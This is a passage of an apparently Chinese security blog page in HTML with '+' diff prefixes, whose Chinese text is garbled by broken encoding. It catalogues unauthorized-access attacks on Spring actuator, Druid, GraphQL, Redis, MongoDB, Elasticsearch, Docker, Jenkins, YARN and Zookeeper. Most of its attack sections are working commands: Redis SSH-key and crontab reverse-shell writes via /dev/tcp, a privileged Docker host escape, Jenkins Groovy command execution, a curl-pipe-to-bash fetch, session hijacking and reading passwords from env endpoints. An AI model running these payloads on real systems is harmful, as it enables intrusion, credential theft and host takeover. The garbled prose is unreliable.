+<h4 id="妫€娴-PoC锛欻eapdump-娉勯湶"><a href="#妫€娴-PoC锛欻eapdump-娉勯湶" class="headerlink" title="妫€娴?PoC锛欻eapdump 娉勯湶"></a>妫€娴?PoC锛欻eapdump 娉勯湶</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 涓嬭浇 heapdump 鏂囦欢</span></span><br><span class="line"><span class="built_in">curl</span> <span class="literal">-o</span> heapdump.bin <span class="string">&quot;http://target.com/actuator/heapdump&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 浣跨敤 Eclipse MAT 鍒嗘瀽锛屾垨浣跨敤鍛戒护琛屽伐鍏锋彁鍙栧瘑鐮?# 瀹夎 MAT 鍚庯細mat -console -application org.eclipse.mat.ui.hprof.browser heapdump.bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 浣跨敤 jhat 蹇€熷垎鏋?jhat heapdump.bin</span></span><br><span class="line"><span class="comment"># 璁块棶 http://localhost:7000/</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="妫€娴-PoC锛欵nv-绔偣娉勯湶"><a href="#妫€娴-PoC锛欵nv-绔偣娉勯湶" class="headerlink" title="妫€娴?PoC锛欵nv 绔偣娉勯湶"></a>妫€娴?PoC锛欵nv 绔偣娉勯湶</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鑾峰彇鐜鍙橀噺涓殑鏁版嵁搴撳瘑鐮?curl &quot;http://target.com/actuator/env&quot; | Select-String -Pattern &quot;password|secret|key|token|jdbc|redis&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鑾峰彇鍏蜂綋閰嶇疆椤圭殑鍊?curl &quot;http://target.com/actuator/env/spring.datasource.password&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-3-Druid-鐩戞帶鏈巿鏉"><a href="#3-3-Druid-鐩戞帶鏈巿鏉" class="headerlink" title="3.3 Druid 鐩戞帶鏈巿鏉?"></a>3.3 Druid 鐩戞帶鏈巿鏉?</h3><p>Druid 鏄樋閲屽反宸村紑婧愮殑鏁版嵁搴撹繛鎺ユ睜缁勪欢銆傚鏋滈厤缃笉褰擄紝Druid 鐩戞帶椤甸潰浼氭毚闇?*SQL 鎵ц璁板綍銆乄eb 搴旂敤 URI銆丼ession 鐩戞帶**绛夋晱鎰熶俊鎭€?</p>
+<h4 id="妫€娴嬭矾寰-1"><a href="#妫€娴嬭矾寰-1" class="headerlink" title="妫€娴嬭矾寰?"></a>妫€娴嬭矾寰?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/druid/index.html</span><br><span class="line">/druid/login.html</span><br><span class="line">/druid/sql.html           鈫?SQL 鎵ц璁板綍</span><br><span class="line">/druid/spring.html         鈫?Spring 鐩戞帶</span><br><span class="line">/druid/websession.html     鈫?Session 鍒楄〃锛堝彲绐冨彇锛?/druid/uri.html            鈫?URI 璁块棶缁熻</span><br><span class="line">/druid/datasource.html     鈫?鏁版嵁婧愰厤缃?```</span><br><span class="line"></span><br><span class="line">#### 鍗卞</span><br><span class="line"></span><br><span class="line">- 鏌ョ湅 SQL 鎵ц璁板綍 鈫?鍒嗘瀽鏁版嵁搴撶粨鏋?- 閫氳繃 Session 鐩戞帶绐冨彇绠＄悊鍛?Session</span><br><span class="line">- 閫氳繃 URI 鐩戞帶浜嗚В鍏ㄧ珯鎺ュ彛</span><br><span class="line"></span><br><span class="line">#### 妫€娴?PoC</span><br><span class="line"></span><br><span class="line">```powershell</span><br><span class="line"># 妫€娴?Druid 鐩戞帶椤?curl &quot;http://target.com/druid/index.html&quot; -o /dev/null -w &quot;%&#123;http_code&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 鐩存帴鑾峰彇 Session 鍒楄〃</span><br><span class="line">curl &quot;http://target.com/druid/websession.json&quot;</span><br><span class="line"></span><br><span class="line"># 鑾峰彇 SQL 鐩戞帶璁板綍</span><br><span class="line">curl &quot;http://target.com/druid/sql.json&quot; | ConvertFrom-Json</span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤-Session-绐冨彇"><a href="#鍒╃敤-Session-绐冨彇" class="headerlink" title="鍒╃敤 Session 绐冨彇"></a>鍒╃敤 Session 绐冨彇</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 浠?Druid 鑾峰彇娲昏穬 Session</span></span><br><span class="line"><span class="variable">$sessions</span> = <span class="built_in">Invoke-RestMethod</span> <span class="string">&quot;http://target.com/druid/websession.json&quot;</span></span><br><span class="line"><span class="comment"># 鍒楄〃涓瘡涓?session 鍖呭惈 sessionId</span></span><br><span class="line"><span class="comment"># 浣跨敤璇?sessionId 鏇挎崲 Cookie 涓殑 JSESSIONID</span></span><br><span class="line"><span class="comment"># 鍗冲彲鍔寔璇ョ敤鎴风殑浼氳瘽鐘舵€?```</span></span><br><span class="line"></span><br><span class="line"><span class="literal">---</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 3.4 GraphQL 鑷渷鏌ヨ娉勯湶</span></span><br><span class="line"></span><br><span class="line">GraphQL 鎻愪緵鑷渷锛圛ntrospection锛夋煡璇㈡満鍒讹紝鐢ㄤ簬瀹㈡埛绔嚜鍔ㄥ彂鐜?Schema銆傚鏋滅敓浜х幆澧冩湭鍏抽棴鑷渷锛屾敾鍑昏€呭彲鑾峰彇**鍏ㄩ儴鏁版嵁绫诲瀷銆佸瓧娈点€佹煡璇㈠拰鍙樻洿鎿嶄綔**銆?</span><br><span class="line"><span class="comment">#### 妫€娴嬭矾寰?</span></span><br></pre></td></tr></table></figure>
+<p>&#x2F;graphql<br>&#x2F;graphql&#x2F;console<br>&#x2F;graphiql<br>&#x2F;playground<br>&#x2F;api&#x2F;graphql<br>&#x2F;v1&#x2F;graphql</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 妫€娴?PoC</span><br><span class="line"></span><br><span class="line">```graphql</span><br><span class="line"># 鑷渷鏌ヨ - 鑾峰彇鍏ㄩ儴 Schema</span><br><span class="line">query &#123;</span><br><span class="line">  __schema &#123;</span><br><span class="line">    types &#123;</span><br><span class="line">      name</span><br><span class="line">      fields &#123;</span><br><span class="line">        name</span><br><span class="line">        type &#123;</span><br><span class="line">          name</span><br><span class="line">          kind</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鍙戦€佽嚜鐪佹煡璇?curl -X POST &quot;http://target.com/graphql&quot; `</span></span><br><span class="line">  <span class="literal">-H</span> <span class="string">&quot;Content-Type: application/json&quot;</span> `</span><br><span class="line">  <span class="literal">-d</span> <span class="string">&#x27;&#123;&quot;query&quot;: &quot;&#123;__schema&#123;types&#123;name fields&#123;name type&#123;name kind&#125;&#125;&#125;&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤"><a href="#鍒╃敤" class="headerlink" title="鍒╃敤"></a>鍒╃敤</h4><ul>
+<li>鍒嗘瀽 Schema 鍙戠幇鏈巿鏉?Mutations锛堝彉鏇存搷浣滐級</li>
+<li>鍙戠幇闅愯棌鐨勬晱鎰熷瓧娈碉紙濡?<code>password</code>, <code>token</code>, <code>ssn</code>锛?- 鎵归噺鏌ヨ缁曡繃闄愬埗</li>
+</ul>
+<hr>
+<h3 id="3-5-ASP-NET-Swagger-SignalR-鏈巿鏉"><a href="#3-5-ASP-NET-Swagger-SignalR-鏈巿鏉" class="headerlink" title="3.5 ASP.NET Swagger &#x2F; SignalR 鏈巿鏉?"></a>3.5 ASP.NET Swagger &#x2F; SignalR 鏈巿鏉?</h3><h4 id="ASP-NET-Swagger-妫€娴"><a href="#ASP-NET-Swagger-妫€娴" class="headerlink" title="ASP.NET Swagger 妫€娴?"></a>ASP.NET Swagger 妫€娴?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/swagger/v1/swagger.json</span><br><span class="line">/swagger/index.html</span><br><span class="line">/swagger/ui/index</span><br></pre></td></tr></table></figure>
+
+<h4 id="SignalR-Hub-鏈巿鏉"><a href="#SignalR-Hub-鏈巿鏉" class="headerlink" title="SignalR Hub 鏈巿鏉?"></a>SignalR Hub 鏈巿鏉?</h4><p>SignalR 瀹炴椂閫氫俊 Hub 鑻ユ湭閴存潈锛屽彲鐩存帴璋冪敤 Hub 鏂规硶銆?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/hub/notification</span><br><span class="line">/signalr/hubs</span><br><span class="line">/chatHub</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="鍥涖€佷腑闂翠欢-鏈嶅姟-API-鏈巿鏉"><a href="#鍥涖€佷腑闂翠欢-鏈嶅姟-API-鏈巿鏉" class="headerlink" title="鍥涖€佷腑闂翠欢 &#x2F; 鏈嶅姟 API 鏈巿鏉?"></a>鍥涖€佷腑闂翠欢 &#x2F; 鏈嶅姟 API 鏈巿鏉?</h2><h3 id="4-1-Redis-鏈巿鏉冭闂"><a href="#4-1-Redis-鏈巿鏉冭闂" class="headerlink" title="4.1 Redis 鏈巿鏉冭闂?"></a>4.1 Redis 鏈巿鏉冭闂?</h3><p><strong>榛樿绔彛</strong>锛?379<br><strong>甯歌鐗堟湰</strong>锛氬叏鐗堟湰<br><strong>CVSS</strong>锛?.8锛圕ritical锛?<br>鐢变簬 Redis 榛樿閰嶇疆涓嶇粦瀹?IP 涓旀棤瀵嗙爜璁よ瘉锛屾敾鍑昏€呭彲鐩存帴杩炴帴 Redis 鏈嶅姟鍣ㄣ€?</p>
+<h4 id="鍗卞"><a href="#鍗卞" class="headerlink" title="鍗卞"></a>鍗卞</h4><ul>
+<li>鏁忔劅鏁版嵁娉勯湶锛堢紦瀛樹腑鐨?Session銆乀oken锛?- 鍐欏叆 SSH 鍏挜 鈫?鐩存帴鐧诲綍鏈嶅姟鍣?- 鍐欏叆 crontab 鈫?鍙嶅脊 Shell</li>
+<li>鍐欏叆 webshell锛堝鏋?web 鐩綍鍙啓锛?- 瑙﹀彂 <code>flushall</code> 娓呯┖鎵€鏈夋暟鎹?</li>
+</ul>
+<h4 id="妫€娴-PoC"><a href="#妫€娴-PoC" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鐩存帴杩炴帴娴嬭瘯</span></span><br><span class="line">redis-cli -h 192.168.1.100 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment"># 杩炴帴鎴愬姛鍚庢墽琛?redis-cli -h 192.168.1.100 info</span></span><br><span class="line"><span class="comment"># 杩斿洖鏈嶅姟鍣ㄤ俊鎭嵆琛ㄧず鏈巿鏉?```</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### 鍒╃敤锛氬啓鍏?SSH 鍏挜</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment"># 鏈湴鐢熸垚瀵嗛挜瀵?ssh-keygen -t rsa</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 灏嗗叕閽ュ啓鍏?Redis</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub | redis-cli -h 192.168.1.100 -x <span class="built_in">set</span> crackit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 璁剧疆澶囦唤璺緞涓?SSH 璁よ瘉鐩綍</span></span><br><span class="line">redis-cli -h 192.168.1.100 config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line">redis-cli -h 192.168.1.100 config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">redis-cli -h 192.168.1.100 save</span><br><span class="line"></span><br><span class="line"><span class="comment"># SSH 鐧诲綍</span></span><br><span class="line">ssh root@192.168.1.100</span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤锛氬啓鍏-crontab-鍙嶅脊-Shell锛圠inux锛"><a href="#鍒╃敤锛氬啓鍏-crontab-鍙嶅脊-Shell锛圠inux锛" class="headerlink" title="鍒╃敤锛氬啓鍏?crontab 鍙嶅脊 Shell锛圠inux锛?"></a>鍒╃敤锛氬啓鍏?crontab 鍙嶅脊 Shell锛圠inux锛?</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.1.100 <span class="built_in">set</span> x <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/浣犵殑IP/4444 0&gt;&amp;1\n&quot;</span></span><br><span class="line">redis-cli -h 192.168.1.100 config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line">redis-cli -h 192.168.1.100 config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h 192.168.1.100 save</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-2-MongoDB-鏈巿鏉冭闂"><a href="#4-2-MongoDB-鏈巿鏉冭闂" class="headerlink" title="4.2 MongoDB 鏈巿鏉冭闂?"></a>4.2 MongoDB 鏈巿鏉冭闂?</h3><p><strong>榛樿绔彛</strong>锛?7017<br><strong>CVSS</strong>锛?.8锛圕ritical锛?</p>
+<h4 id="妫€娴-PoC-1"><a href="#妫€娴-PoC-1" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 浣跨敤 nmap 妫€娴?nmap -p 27017 --script mongodb-info 192.168.1.100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鐩存帴杩炴帴锛堟棤瀵嗙爜锛?mongo 192.168.1.100:27017</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鎴栦娇鐢?Robo 3T 宸ュ叿鍥惧舰鍖栬繛鎺?```</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#### 鍒╃敤</span></span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line"><span class="comment"># 杩炴帴鍚庢煡鐪嬫暟鎹簱</span></span><br><span class="line">mongo 192.168.1.100:27017</span><br><span class="line">show dbs</span><br><span class="line">use admin</span><br><span class="line">db.auth(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;admin&quot;</span>)  <span class="comment"># 灏濊瘯寮卞彛浠?show collections</span></span><br><span class="line">db.users.find()            <span class="comment"># 璇诲彇鐢ㄦ埛鏁版嵁</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-3-Elasticsearch-鏈巿鏉冭闂"><a href="#4-3-Elasticsearch-鏈巿鏉冭闂" class="headerlink" title="4.3 Elasticsearch 鏈巿鏉冭闂?"></a>4.3 Elasticsearch 鏈巿鏉冭闂?</h3><p><strong>榛樿绔彛</strong>锛?200锛圚TTP API锛夈€?300锛圱CP锛?<br><strong>CVSS</strong>锛?.6锛圚igh锛?</p>
+<h4 id="妫€娴嬭矾寰-2"><a href="#妫€娴嬭矾寰-2" class="headerlink" title="妫€娴嬭矾寰?"></a>妫€娴嬭矾寰?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /             鈫?闆嗙兢淇℃伅</span><br><span class="line">GET /_cat/indices 鈫?鎵€鏈夌储寮?GET /_cat/        鈫?鎵€鏈?API 鍒楄〃</span><br><span class="line">GET /_cluster/health 鈫?闆嗙兢鍋ュ悍鐘舵€?GET /_cluster/state  鈫?闆嗙兢鐘舵€?GET /_all/_search 鈫?鎼滅储鍏ㄩ儴鏁版嵁</span><br><span class="line">GET /_nodes       鈫?鑺傜偣淇℃伅</span><br><span class="line">GET /_plugin/head 鈫?绠＄悊鐣岄潰</span><br></pre></td></tr></table></figure>
+
+<h4 id="妫€娴-PoC-2"><a href="#妫€娴-PoC-2" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鑾峰彇闆嗙兢淇℃伅</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.1.100:9200/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鑾峰彇鎵€鏈夌储寮曞垪琛?curl &quot;http://192.168.1.100:9200/_cat/indices?v&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鎼滅储鍏ㄩ儴鏁版嵁</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.1.100:9200/_all/_search?size=100&quot;</span> | <span class="built_in">ConvertFrom-Json</span> | <span class="built_in">ConvertTo-Json</span> <span class="literal">-Depth</span> <span class="number">5</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-4-Docker-Remote-API-鏈巿鏉"><a href="#4-4-Docker-Remote-API-鏈巿鏉" class="headerlink" title="4.4 Docker Remote API 鏈巿鏉?"></a>4.4 Docker Remote API 鏈巿鏉?</h3><p><strong>榛樿绔彛</strong>锛?375锛堟湭鍔犲瘑锛夈€?376锛圱LS锛?<br>Docker 瀹堟姢杩涚▼榛樿缁戝畾鍦ㄦ湰鍦?Unix Socket锛屼絾濡傛灉閰嶇疆涓虹洃鍚?TCP 绔彛涓旀湭鍔?TLS 璁よ瘉锛屾敾鍑昏€呭彲瀹屽叏鎺у埗 Docker 瀹夸富鏈恒€?</p>
+<h4 id="妫€娴-PoC-3"><a href="#妫€娴-PoC-3" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鑾峰彇 Docker 鐗堟湰淇℃伅</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.1.100:2375/version&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍒楀嚭鎵€鏈夊鍣?curl &quot;http://192.168.1.100:2375/containers/json?all=true&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍒楀嚭鎵€鏈夐暅鍍?curl &quot;http://192.168.1.100:2375/images/json&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 鑾峰彇 Docker 淇℃伅</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.1.100:2375/info&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤锛氬惎鍔ㄧ壒鏉冨鍣-鈫-瀹夸富鏈烘拨闄"><a href="#鍒╃敤锛氬惎鍔ㄧ壒鏉冨鍣-鈫-瀹夸富鏈烘拨闄" class="headerlink" title="鍒╃敤锛氬惎鍔ㄧ壒鏉冨鍣?鈫?瀹夸富鏈烘拨闄?"></a>鍒╃敤锛氬惎鍔ㄧ壒鏉冨鍣?鈫?瀹夸富鏈烘拨闄?</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鍚姩涓€涓壒鏉冨鍣紝鎸傝浇瀹夸富鏈烘牴鐩綍</span></span><br><span class="line">docker -H tcp://192.168.1.100:2375 run -it --privileged -v /:/host alpine <span class="built_in">chroot</span> /host bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 姝ゆ椂宸茶幏寰楀涓绘満鐨?root shell</span></span><br><span class="line"><span class="comment"># 鍙坊鍔?SSH 鍏挜銆佸垱寤虹敤鎴枫€佹鍏ュ悗闂ㄧ瓑</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-5-Jenkins-鏈巿鏉冭闂"><a href="#4-5-Jenkins-鏈巿鏉冭闂" class="headerlink" title="4.5 Jenkins 鏈巿鏉冭闂?"></a>4.5 Jenkins 鏈巿鏉冭闂?</h3><p><strong>榛樿绔彛</strong>锛?080</p>
+<p>Jenkins 鍦ㄦ湭閰嶇疆瀹夊叏璁よ瘉鏃讹紝浠讳綍浜洪兘鍙互璁块棶绠＄悊鍚庡彴锛屾墽琛屾瀯寤轰换鍔°€佹煡鐪嬫帶鍒跺彴杈撳嚭锛岀敋鑷虫墽琛岀郴缁熷懡浠ゃ€?</p>
+<h4 id="妫€娴嬭矾寰-3"><a href="#妫€娴嬭矾寰-3" class="headerlink" title="妫€娴嬭矾寰?"></a>妫€娴嬭矾寰?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://target:8080/</span><br><span class="line">http://target:8080/script</span><br><span class="line">http://target:8080/scriptText</span><br><span class="line">http://target:8080/computer/</span><br><span class="line">http://target:8080/configure</span><br><span class="line">http://target:8080/credentials/</span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤锛氳剼鏈懡浠よ鎵ц"><a href="#鍒╃敤锛氳剼鏈懡浠よ鎵ц" class="headerlink" title="鍒╃敤锛氳剼鏈懡浠よ鎵ц"></a>鍒╃敤锛氳剼鏈懡浠よ鎵ц</h4><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Jenkins Script Console 涓殑鎭舵剰鑴氭湰</span></span><br><span class="line"><span class="keyword">def</span> cmd = <span class="string">&quot;whoami&quot;</span>.execute()</span><br><span class="line">println(<span class="string">&quot;$&#123;cmd.text&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鎵ц绯荤粺鍛戒护鑾峰彇 Shell</span></span><br><span class="line">println(<span class="string">&quot;id&quot;</span>.execute().text)</span><br><span class="line">println(<span class="string">&quot;cat /etc/passwd&quot;</span>.execute().text)</span><br></pre></td></tr></table></figure>
+
+<h4 id="鍒╃敤锛氶€氳繃鏋勫缓浠诲姟鎵ц鍛戒护"><a href="#鍒╃敤锛氶€氳繃鏋勫缓浠诲姟鎵ц鍛戒护" class="headerlink" title="鍒╃敤锛氶€氳繃鏋勫缓浠诲姟鎵ц鍛戒护"></a>鍒╃敤锛氶€氳繃鏋勫缓浠诲姟鎵ц鍛戒护</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鍒涘缓鎴栦慨鏀规瀯寤轰换鍔★紝鍦ㄦ瀯寤烘楠や腑鎵ц绯荤粺鍛戒护</span></span><br><span class="line"><span class="comment"># &quot;Execute shell&quot; 姝ラ涓緭鍏ワ細</span></span><br><span class="line"><span class="built_in">curl</span> http://your<span class="literal">-server</span>/shell.sh | bash</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-6-Hadoop-YARN-ResourceManager-鏈巿鏉"><a href="#4-6-Hadoop-YARN-ResourceManager-鏈巿鏉" class="headerlink" title="4.6 Hadoop YARN ResourceManager 鏈巿鏉?"></a>4.6 Hadoop YARN ResourceManager 鏈巿鏉?</h3><p><strong>榛樿绔彛</strong>锛?088</p>
+<p>YARN ResourceManager 鐨?Web UI 鍜岀鐞?API 鏈巿鏉冩椂锛屾敾鍑昏€呭彲鎻愪氦鎭舵剰 Application 鎵ц浠绘剰鍛戒护銆?</p>
+<h4 id="妫€娴嬭矾寰-4"><a href="#妫€娴嬭矾寰-4" class="headerlink" title="妫€娴嬭矾寰?"></a>妫€娴嬭矾寰?</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://target:8088/cluster</span><br><span class="line">http://target:8088/ws/v1/cluster</span><br><span class="line">http://target:8088/ws/v1/cluster/apps</span><br></pre></td></tr></table></figure>
+
+<h4 id="妫€娴-PoC-4"><a href="#妫€娴-PoC-4" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 鑾峰彇闆嗙兢淇℃伅</span></span><br><span class="line"><span class="built_in">curl</span> <span class="string">&quot;http://192.168.1.100:8088/ws/v1/cluster/info&quot;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-7-Zookeeper-鏈巿鏉冭闂"><a href="#4-7-Zookeeper-鏈巿鏉冭闂" class="headerlink" title="4.7 Zookeeper 鏈巿鏉冭闂?"></a>4.7 Zookeeper 鏈巿鏉冭闂?</h3><p><strong>榛樿绔彛</strong>锛?181</p>
+<h4 id="妫€娴-PoC-5"><a href="#妫€娴-PoC-5" class="headerlink" title="妫€娴?PoC"></a>妫€娴?PoC</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 浣跨敤 zkCli 杩炴帴</span></span><br><span class="line">zkCli.sh -server 192.168.1.100:2181</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鎴栦娇鐢?echo 鍛戒护</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;envi&quot;</span> | nc 192.168.1.100 2181</span><br><span class="line"><span class="comment"># 杩斿洖鐜淇℃伅鍗宠〃绀烘湭鎺堟潈</span></span><br></pre></td></tr></table></figure>
+
